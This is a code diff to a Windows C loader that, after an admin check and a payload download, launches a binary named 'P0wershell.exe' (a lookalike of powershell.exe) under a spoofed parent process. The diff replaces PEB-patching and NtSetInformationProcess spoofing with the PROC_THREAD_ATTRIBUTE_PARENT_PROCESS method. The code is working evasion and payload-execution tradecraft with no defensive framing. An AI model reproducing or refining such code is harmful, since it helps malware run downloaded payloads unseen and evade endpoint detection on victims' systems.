@@ -5,14 +5,6 @@
 
 BOOL WINAPI IsUserAnAdmin(void);
 
-typedef struct _PROCESS_BASIC_INFORMATION {
-    PVOID Reserved1;
-    PVOID PebBaseAddress;
-    PVOID Reserved2[2];
-    ULONG_PTR UniqueProcessId;
-    ULONG_PTR InheritedFromUniqueProcessId;
-} PROCESS_BASIC_INFORMATION;
-
 int main(void) {
     if (!IsUserAnAdmin())
         return 1;
@@ -69,67 +61,55 @@ int main(void) {
     }
     printf("[+] Download complete.\n");
 
-    // open target for handle duplication
-    HANDLE hTarget = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, targetPID);
-    if (!hTarget) {
+    // PPID spoofing via CreateProcess attribute
+    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetPID);
+    if (!hParent) {
         printf("[-] Failed to open target process (%lu)\n", GetLastError());
         return 1;
     }
+    printf("[+] Opened target process handle\n");
 
-    // resolve NtQueryInformationProcess from ntdll
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG) =
-        (NTSTATUS (NTAPI *)(HANDLE, DWORD, PVOID, ULONG, PULONG))GetProcAddress(hNtdll, "NtQueryInformationProcess");
-
-    // resolve NtSetInformationProcess from ntdll
-    NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG) =
-        (NTSTATUS (NTAPI *)(HANDLE, DWORD, PVOID, ULONG))GetProcAddress(hNtdll, "NtSetInformationProcess");
-
-    if (!pNtQueryInformationProcess || !pNtSetInformationProcess) {
-        printf("[-] Failed to resolve NT APIs\n");
-        CloseHandle(hTarget);
+    SIZE_T attrSize = 0;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+    PPROC_THREAD_ATTRIBUTE_LIST attrList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
+    if (!attrList) {
+        printf("[-] HeapAlloc failed\n");
+        CloseHandle(hParent);
         return 1;
     }
 
-    // create P0wershell.exe suspended
-    STARTUPINFOA si = { .cb = sizeof(STARTUPINFOA) };
+    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
+        printf("[-] InitializeProcThreadAttributeList failed (%lu)\n", GetLastError());
+        HeapFree(GetProcessHeap(), 0, attrList);
+        CloseHandle(hParent);
+        return 1;
+    }
+
+    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
+        printf("[-] UpdateProcThreadAttribute failed (%lu)\n", GetLastError());
+        DeleteProcThreadAttributeList(attrList);
+        HeapFree(GetProcessHeap(), 0, attrList);
+        CloseHandle(hParent);
+        return 1;
+    }
+    printf("[+] PPID attribute set\n");
+
+    STARTUPINFOEXA si = { .StartupInfo = { .cb = sizeof(STARTUPINFOEXA) }, .lpAttributeList = attrList };
     PROCESS_INFORMATION pi;
-    if (!CreateProcessA(NULL, (LPSTR)outPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+    if (!CreateProcessA(NULL, (LPSTR)outPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &si.StartupInfo, &pi)) {
         printf("[-] CreateProcess failed (%lu)\n", GetLastError());
-        CloseHandle(hTarget);
+        DeleteProcThreadAttributeList(attrList);
+        HeapFree(GetProcessHeap(), 0, attrList);
+        CloseHandle(hParent);
         return 1;
     }
-    printf("[+] Created P0wershell.exe suspended (PID: %lu)\n", pi.dwProcessId);
-
-    // attempt PPID spoofing via NtSetInformationProcess
-    DWORD parentPID = targetPID;
-    NTSTATUS status = pNtSetInformationProcess(pi.hProcess, 0x1D, &parentPID, sizeof(DWORD));
-    if (status >= 0) {
-        printf("[+] PPID spoofed via NtSetInformationProcess\n");
-    } else {
-        // fallback: modify PEB directly
-        PROCESS_BASIC_INFORMATION pbi;
-        ULONG retLen;
-        status = pNtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen);
-        if (status >= 0) {
-            ULONG_PTR newParent = (ULONG_PTR)targetPID;
-            if (WriteProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x098, &newParent, sizeof(ULONG_PTR), NULL)) {
-                printf("[+] PPID spoofed via PEB modification\n");
-            } else {
-                printf("[-] PEB modification failed (%lu)\n", GetLastError());
-            }
-        } else {
-            printf("[-] NtQueryInformationProcess failed\n");
-        }
-    }
-
-    // resume the process
-    ResumeThread(pi.hThread);
-    printf("[+] P0wershell.exe resumed\n");
+    printf("[+] P0wershell.exe launched (PID: %lu)\n", pi.dwProcessId);
 
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    CloseHandle(hTarget);
+    DeleteProcThreadAttributeList(attrList);
+    HeapFree(GetProcessHeap(), 0, attrList);
+    CloseHandle(hParent);
 
     Sleep(2000);
     return 0;
